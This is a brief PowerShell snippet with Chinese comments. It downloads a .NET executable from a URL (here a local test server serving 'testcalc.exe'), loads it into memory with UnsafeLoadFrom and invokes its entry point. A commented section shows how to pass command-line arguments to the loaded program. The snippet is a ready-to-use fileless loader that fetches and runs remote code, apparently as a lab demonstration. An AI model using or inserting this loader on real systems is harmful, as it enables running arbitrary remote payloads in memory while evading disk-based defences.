# 远程下载
$invoke2 = [System.Reflection.Assembly]::UnsafeLoadFrom("http://127.0.0.1:8000/testcalc.exe");
[System.Console]::WriteLine($invoke2);
$invoke2.EntryPoint.Invoke($null,$null)

# 如果你有参数
# $args = New-Object -TypeName System.Collections.ArrayList
# [string[]]$strings = "-group=all","-full"
# $args.Add($strings)
# $invoke.EntryPoint.Invoke($null,$args.ToArray());